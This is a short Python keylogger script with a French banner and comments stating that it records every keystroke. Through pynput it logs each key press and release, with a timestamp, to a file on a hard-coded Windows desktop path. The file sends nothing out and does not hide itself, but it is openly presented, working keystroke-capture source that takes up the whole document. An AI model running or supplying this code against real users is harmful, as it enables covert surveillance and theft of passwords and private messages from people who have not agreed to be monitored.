################################################################################################################
##        _____                        _  __      ##       _  __          _                                   ##
##       / ____|                      | |/ /      ##      | |/ /         | |                                  ##
##      | |  __  __ _ _ __ ___   ___  | ' /       ##      | ' / ___ _   _| | ___   __ _  __ _  ___ _ __       ##
##      | | |_ |/ _` | '_ ` _ \ / _ \ |  <        ##      |  < / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|      ##
##      | |__| | (_| | | | | | |  __/ | . \       ##      | . \  __/ |_| | | (_) | (_| | (_| |  __/ |         ##
##       \_____|\__,_|_| |_| |_|\___| |_|\_\      ##      |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|         ##
##                                                ##                 __/ |         __/ | __/ |                ##
####################################################################|___/#########|___/#|___/###################
##                                                                                                            ##
##                  Ce programme permet d'enregistrer toute les frappe au clavier                             ##
##                                                                                                            ##
################################################################################################################

from pynput.keyboard import Key, Listener
import datetime

################################################################################################################
chemin = "D:\Système\Desktop"                           ##  Configuration du chemin                           ##
################################################################################################################
lecture = "a"                                           ##  Configuration du mode de lecture                  ##
################################################################################################################

day = ""
month = ""
hour = ""
minute = ""
second = ""

def on_press(key):
    fichier = open((str(chemin) + "\Keylogger.log"), lecture)
    date = datetime.datetime.now()
    if date.day <= 9:
        day = "0" + str(date.day)
    elif date.day >= 10:
        day = str(date.day)
    if date.month <= 9:
        month = "0" + str(date.month)
    elif date.month >= 10:
        month = str(date.month)
    if date.hour <= 9:
        hour = "0" + str(date.hour)
    elif date.hour >= 10:
        hour = str(date.hour)
    if date.minute <= 9:
        minute = "0" + str(date.minute)
    elif date.minute >= 10:
        minute = str(date.minute)
    if date.second <= 9:
        second = "0" + str(date.second)
    elif date.second >= 10:
        second = str(date.second)
    log = ("\n[" + str(day) + "/" + str(month) + "/" + str(date.year) + " " + str(hour) + ":" + str(minute) + ":" + str(second) + "]   " + '{0} pressed'.format(key))
    fichier.write(str(log))
    
def on_release(key):
    fichier = open((str(chemin) + "\Keylogger.log"), lecture)
    date = datetime.datetime.now()
    if date.day <= 9:
        day = "0" + str(date.day)
    elif date.day >= 10:
        day = str(date.day)
    if date.month <= 9:
        month = "0" + str(date.month)
    elif date.month >= 10:
        month = str(date.month)
    if date.hour <= 9:
        hour = "0" + str(date.hour)
    elif date.hour >= 10:
        hour = str(date.hour)
    if date.minute <= 9:
        minute = "0" + str(date.minute)
    elif date.minute >= 10:
        minute = str(date.minute)
    if date.second <= 9:
        second = "0" + str(date.second)
    elif date.second >= 10:
        second = str(date.second)
    log = ("\n[" + str(day) + "/" + str(month) + "/" + str(date.year) + " " + str(hour) + ":" + str(minute) + ":" + str(second) + "]   " + '{0} release'.format(key))
    fichier.write(str(log))

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()